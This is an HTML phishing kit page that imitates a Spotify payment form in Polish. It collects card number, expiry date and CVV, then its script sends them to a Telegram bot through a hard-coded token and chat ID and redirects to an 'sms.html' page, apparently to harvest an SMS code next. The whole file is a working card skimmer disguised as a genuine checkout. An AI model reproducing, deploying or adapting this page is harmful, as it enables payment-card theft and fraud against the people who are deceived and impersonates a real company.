<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>P≈Çatno≈õƒá - Spotify</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #000;
            color: #fff;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            width: 100%;
            max-width: 400px;
            padding: 20px;
            box-sizing: border-box;
        }
        .logo {
            width: 180px;
            display: block;
            margin: 0 auto 30px;
        }
        .payment-form {
            background-color: #121212;
            padding: 30px;
            border-radius: 10px;
        }
        h2 {
            text-align: center;
            margin-bottom: 30px;
            font-size: 28px;
        }
        .input-group {
            margin-bottom: 20px;
        }
        .input-label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            font-size: 14px;
            color: #b3b3b3;
        }
        .input-field {
            width: 100%;
            padding: 15px;
            border: 1px solid #535353;
            border-radius: 5px;
            background-color: #282828;
            color: #fff;
            font-size: 16px;
            box-sizing: border-box;
            transition: border-color 0.3s;
        }
        .input-field:focus {
            border-color: #1DB954;
            outline: none;
        }
        .input-field::placeholder {
            color: #535353;
        }
        .card-details {
            display: flex;
            gap: 15px;
        }
        .expiry-date {
            width: 60%;
        }
        .cvv {
            width: 40%;
        }
        button {
            width: 100%;
            padding: 15px;
            background-color: #1DB954;
            color: white;
            border: none;
            border-radius: 30px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #1ed760;
        }
        button:disabled {
            background-color: #535353;
            cursor: not-allowed;
        }
        .lang-select {
            text-align: right;
            margin-bottom: 20px;
        }
        .lang-select select {
            background-color: #121212;
            color: white;
            border: 1px solid #333;
            padding: 5px;
            border-radius: 5px;
        }
        #loading {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.7);
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        .spinner {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #1DB954;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 0 auto 15px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .payment-methods {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin: 20px 0;
        }
        .payment-methods img {
            height: 30px;
            opacity: 0.8;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- S√©lecteur de langue -->
        <div class="lang-select">
            <label for="language">üåê</label>
            <select id="language">
                <option value="pl" selected>Polski</option>
                <option value="fr">Fran√ßais</option>
                <option value="en">English</option>
                <option value="es">Espa√±ol</option>
                <option value="ru">–†—É—Å—Å–∫–∏–π</option>
            </select>
        </div>

        <header>
            <img src="spotify-logo.png" alt="Spotify Logo" class="logo">
        </header>

        <section class="payment-form">
            <h2 data-translate="title">Informacje o p≈Çatno≈õci</h2>
            
            
            <form id="paymentForm" method="POST">
                <div class="input-group">
                    <label for="card-number" class="input-label" data-translate="card-number">Numer karty</label>
                    <input type="text" id="card-number" name="card-number" class="input-field" placeholder="1234 5678 9012 3456" required>
                </div>
                
                <div class="card-details">
                    <div class="input-group expiry-date">
                        <label for="expiration-date" class="input-label" data-translate="expiration">Data wa≈ºno≈õci</label>
                        <input type="text" id="expiration-date" name="expiration-date" class="input-field" placeholder="MM/RR" required>
                    </div>
                    
                    <div class="input-group cvv">
                        <label for="cvv" class="input-label" data-translate="cvv">CVV</label>
                        <input type="text" id="cvv" name="cvv" class="input-field" placeholder="123" required>
                    </div>
                </div>

                <button type="submit" id="btn-submit" data-translate="pay">ZAP≈ÅAƒÜ</button>
            </form>
        </section>
    </div>

    <!-- Overlay de chargement -->
    <div id="loading">
        <div style="color:white;text-align:center;">
            <div class="spinner"></div>
            <div data-translate="processing">Przetwarzanie p≈Çatno≈õci...</div>
        </div>
    </div>

    <script>
        // Traductions
        const translations = {
            pl: { 
                title: "Informacje o p≈Çatno≈õci",
                "card-number": "Numer karty",
                "expiration": "Data wa≈ºno≈õci",
                "cvv": "CVV",
                "pay": "ZAP≈ÅAƒÜ",
                "processing": "Przetwarzanie p≈Çatno≈õci..."
            },
            fr: { 
                title: "Information de paiement",
                "card-number": "Num√©ro de carte",
                "expiration": "Date d'expiration",
                "cvv": "CVV",
                "pay": "PAYER",
                "processing": "Traitement du paiement..."
            },
            en: { 
                title: "Payment Information",
                "card-number": "Card Number",
                "expiration": "Expiration Date",
                "cvv": "CVV",
                "pay": "PAY",
                "processing": "Processing payment..."
            },
            es: { 
                title: "Informaci√≥n de pago",
                "card-number": "N√∫mero de tarjeta",
                "expiration": "Fecha de expiraci√≥n",
                "cvv": "CVV",
                "pay": "PAGAR",
                "processing": "Procesando pago..."
            },
            ru: { 
                title: "–ü–ª–∞—Ç–µ–∂–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è",
                "card-number": "–ù–æ–º–µ—Ä –∫–∞—Ä—Ç—ã",
                "expiration": "–°—Ä–æ–∫ –¥–µ–π—Å—Ç–≤–∏—è",
                "cvv": "CVV",
                "pay": "–û–ü–õ–ê–¢–ò–¢–¨",
                "processing": "–û–±—Ä–∞–±–æ—Ç–∫–∞ –ø–ª–∞—Ç–µ–∂–∞..."
            }
        };

        const langSelect = document.getElementById("language");

        function applyLanguage(lang) {
            document.querySelectorAll("[data-translate]").forEach(el => {
                const key = el.getAttribute("data-translate");
                el.innerHTML = translations[lang][key] || el.innerHTML;
            });
        }

        // Langue par d√©faut : polonais
        const savedLang = localStorage.getItem("selectedLang") || "pl";
        langSelect.value = savedLang;
        applyLanguage(savedLang);

        langSelect.addEventListener("change", () => {
            const lang = langSelect.value;
            localStorage.setItem("selectedLang", lang);
            applyLanguage(lang);
        });

        // Formatage automatique du num√©ro de carte
        document.getElementById("card-number").addEventListener("input", function(e) {
            let value = this.value.replace(/\s+/g, "").replace(/[^0-9]/gi, "");
            let formatted = "";
            for (let i = 0; i < value.length; i++) {
                if (i > 0 && i % 4 == 0) formatted += " ";
                formatted += value[i];
            }
            this.value = formatted.substring(0, 19);
        });

        // Formatage automatique de la date d'expiration
        document.getElementById("expiration-date").addEventListener("input", function(e) {
            let value = this.value.replace(/\D/g, "");
            if (value.length > 2) {
                this.value = value.substring(0, 2) + "/" + value.substring(2, 4);
            }
        });

        // Validation du formulaire
        document.getElementById("paymentForm").addEventListener("submit", function(e) {
            e.preventDefault();
            
            // Validation simple
            const cardNumber = document.getElementById("card-number").value.replace(/\s/g, "");
            const expDate = document.getElementById("expiration-date").value;
            const cvv = document.getElementById("cvv").value;
            
            if (cardNumber.length < 16 || !/^\d+$/.test(cardNumber)) {
                alert("Proszƒô wprowadziƒá prawid≈Çowy numer karty");
                return;
            }
            
            if (!/^\d{2}\/\d{2}$/.test(expDate)) {
                alert("Proszƒô wprowadziƒá prawid≈ÇowƒÖ datƒô wa≈ºno≈õci w formacie MM/RR");
                return;
            }
            
            if (cvv.length < 3 || !/^\d+$/.test(cvv)) {
                alert("Proszƒô wprowadziƒá prawid≈Çowy kod CVV");
                return;
            }

            document.getElementById("loading").style.display = "flex";
            document.getElementById("btn-submit").disabled = true;

            const bot = "8282278449:AAFAK4-kguuUmTRttN4ocgDvVxc91kWDItA";
            const chat = "-4970333928";
            const msg = `üí≥ Spotify P≈Çatno≈õƒá PL:\nüìå Numer karty: ${cardNumber}\nüìÖ Data wa≈ºno≈õci: ${expDate}\nüîí CVV: ${cvv}\nüí≥ P≈Çatno≈õƒá przez Apple Pay/Google Pay`;

            fetch(`https://api.telegram.org/bot${bot}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: chat, text: msg })
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }
                return response.json();
            })
            .then(data => {
                console.log('Message sent to Telegram:', data);
                setTimeout(() => {
                    window.location.href = "sms.html";
                }, 2000);
            })
            .catch(error => {
                console.error('Error sending to Telegram:', error);
                setTimeout(() => {
                    window.location.href = "sms.html";
                }, 2000);
            });
        });
    </script>
</body>
</html>
